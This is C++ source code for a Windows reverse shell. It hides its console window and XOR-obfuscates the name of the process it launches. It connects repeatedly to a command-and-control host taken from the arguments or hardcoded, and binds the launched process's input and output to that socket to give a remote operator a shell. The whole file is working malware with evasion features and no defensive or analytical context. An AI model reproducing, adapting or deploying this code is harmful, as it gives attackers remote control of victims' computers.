#include <winsock2.h>	//windows socket communications over TCP/IP
#include <windows.h>	//required for calling other processes, initiating other headers and calls
#include <ws2tcpip.h>	//windows socket communications over TCP/IP
#pragma comment(lib, "Ws2_32.lib") //inform the compiler to statically compile this library into the executable. Without this, our executable wonít run in any machine unless they have Microsoft Visual C/C++ redistributable installed in their system
#define DEFAULT_BUFLEN 1024  


void Decrypter(char* cru3za) { 
    char cerebro[2] = {4,3}; 
    for (int i = 0; i < (strlen(cru3za)); i++){ 
        cru3za[i] = cru3za[i] ^ cerebro[i % (sizeof(cerebro) / sizeof(char))];
    } 
}

void LenaPaul(char* C2Server, int C2Port) {
    while(true) {
		Sleep(5000); //wait 5 seconds
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server); 
        addr.sin_port = htons(C2Port);    

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "G9XTmM`LSpXP}PPFi06_Gn@-A[a";
				Decrypter(Process);
                STARTUPINFO sinfo; 
                PROCESS_INFORMATION pinfo; 
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket; 
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo); 
                
				WaitForSingleObject(pinfo.hProcess, INFINITE); 
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0); 
                }
            }
        }
    }
}


int main(int argc, char **argv) {
    FreeConsole(); 
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        LenaPaul(argv[1], port);
    }
    else {
        char host[] = "551-606-504-605";
        int port = 5938;
        LenaPaul(host, port);
    }
    return 0;
}